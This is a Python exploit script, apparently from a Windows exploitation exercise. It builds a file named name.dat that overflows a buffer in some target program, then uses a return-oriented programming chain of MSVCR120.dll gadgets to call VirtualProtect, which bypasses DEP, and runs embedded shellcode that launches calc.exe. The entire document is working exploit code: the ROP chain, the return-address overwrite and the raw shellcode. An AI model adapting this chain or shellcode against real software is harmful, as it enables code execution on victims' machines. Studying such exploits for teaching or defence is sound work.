import struct

# The signature of VirtualProtect is the following:
#   BOOL WINAPI VirtualProtect(
#     _In_   LPVOID lpAddress,
#     _In_   SIZE_T dwSize,
#     _In_   DWORD flNewProtect,
#     _Out_  PDWORD lpflOldProtect
#   );

# After PUSHAD is executed, the stack looks like this:
#   .
#   .
#   .
#   EDI (ptr to ROP NOP (RETN))
#   ESI (ptr to JMP [EAX] (EAX = address of ptr to VirtualProtect))
#   EBP (ptr to POP (skips EAX on the stack))
#   ESP (lpAddress (automatic))
#   EBX (dwSize)
#   EDX (NewProtect (0x40 = PAGE_EXECUTE_READWRITE))
#   ECX (lpOldProtect (ptr to writeable address))
#   EAX (address of ptr to VirtualProtect)
# lpAddress:
#   ptr to "call esp"
#   <shellcode>

msvcr120 = 0x73c60000

# Delta used to fix the addresses based on the new base address of msvcr120.dll.
md = msvcr120 - 0x70480000


def create_rop_chain(code_size):
    rop_gadgets = [
      md + 0x7053fc6f,  # POP EBP # RETN [MSVCR120.dll]
      md + 0x7053fc6f,  # skip 4 bytes [MSVCR120.dll]
      md + 0x704f00f6,  # POP EBX # RETN [MSVCR120.dll]
      code_size,        # code_size -> ebx
      md + 0x704b6580,  # POP EDX # RETN [MSVCR120.dll]
      0x00000040,       # 0x00000040-> edx
      md + 0x7049f8cb,  # POP ECX # RETN [MSVCR120.dll]
      md + 0x705658f2,  # &Writable location [MSVCR120.dll]
      md + 0x7048f95c,  # POP EDI # RETN [MSVCR120.dll]
      md + 0x7048f607,  # RETN (ROP NOP) [MSVCR120.dll]
      md + 0x704eb436,  # POP ESI # RETN [MSVCR120.dll]
      md + 0x70493a17,  # JMP [EAX] [MSVCR120.dll]
      md + 0x7053b8fb,  # POP EAX # RETN [MSVCR120.dll]
      md + 0x705651a4,  # ptr to &VirtualProtect() [IAT MSVCR120.dll]
      md + 0x7053b7f9,  # PUSHAD # RETN [MSVCR120.dll]
      md + 0x704b7e5d,  # ptr to 'call esp' [MSVCR120.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)


def write_file(file_path):
    with open(file_path, 'wb') as f:
        ret_eip = md + 0x7048f607       # RETN (ROP NOP) [MSVCR120.dll]
        shellcode = (
            "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02" +
            "\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa" +
            "\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8" +
            "\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02" +
            "\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45" +
            "\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6" +
            "\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c" +
            "\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0" +
            "\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53" +
            "\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45" +
            "\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2" +
            "\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b" +
            "\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff" +
            "\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0" +
            "\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75" +
            "\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d" +
            "\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c" +
            "\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24" +
            "\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04" +
            "\x30\x03\xc6\xeb\xdd")
        code_size = len(shellcode)
        name = 'a'*36 + struct.pack('<I', ret_eip) + create_rop_chain(code_size) + shellcode
        f.write(name)

write_file(r'c:\deleteme\name.dat')
